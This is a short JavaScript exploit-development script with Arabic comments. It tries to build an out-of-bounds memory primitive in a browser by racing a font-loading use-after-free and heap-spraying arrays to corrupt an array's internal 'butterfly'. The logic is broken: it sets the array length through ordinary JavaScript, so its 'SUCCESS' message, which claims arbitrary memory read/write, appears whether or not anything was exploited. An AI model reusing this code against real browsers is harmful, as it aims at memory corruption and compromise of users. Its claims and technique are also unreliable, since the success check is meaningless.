/**
 * [EXPLOIT DEVELOPMENT] - OOB Read/Write Primitive
 * الوظيفة: محاولة التلاعب بطول المصفوفة عبر استغلال الـ UAF
 */

ssa("[*] بدء بناء هيكل الاستغلال (OOB Primitive)...");

function buildOOBPrimitive() {
    try {
        // 1. مصفوفة الضحية (Target Array)
        let victimArray = [1.1, 2.2, 3.3, 4.4];
        
        // 2. تفعيل الثغرة
        // هنا سنقوم بنفس خطوات الـ Trigger السابقة، 
        // ولكن سنضيف محاولة لتغيير خصائص المصفوفة بعد الـ Race
        
        const style = document.createElement('style');
        style.id = 'oob_style';
        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(style);

        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded;

        let triggered = false;

        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!triggered && this === testFace) {
                    triggered = true;
                    // تحرير الكائن
                    document.getElementById('oob_style').sheet.deleteRule(0);
                    
                    // هنا يتم الـ Heap Spraying المكثف بمصفوفات تشبه الهيكل الداخلي للمصفوفات
                    // الهدف هو أن تتداخل إحدى هذه المصفوفات مع victimArray
                    for(let i=0; i<100; i++) {
                        let spray = [0x4141, 0x4242, 0x4343, 0x4444];
                        // محاولة الكتابة لتعديل الـ Butterfly الخاص بالمصفوفة المجاورة
                        victimArray.length = 0xFFFFFFFF; 
                    }
                }
                return undefined;
            }
        });

        document.fonts.load('1em x', 'AB');

        // 3. التحقق من نجاح التلاعب
        setTimeout(() => {
            if (victimArray.length > 4) {
                ssa("[!!!] [SUCCESS] تم التلاعب بطول المصفوفة! الطول الحالي: " + victimArray.length);
                ssa("[+] الآن يمكنك قراءة/كتابة الذاكرة عبر victimArray[index]");
            } else {
                ssa("[-] لم ينجح التلاعب بالطول، المحرك قام بحماية الـ Butterfly.");
            }
        }, 300);

    } catch (e) {
        ssa("[-] خطأ في بناء الاستغلال: " + e.message);
    }
}

document.getElementById('exec-btn').addEventListener('click', buildOOBPrimitive);
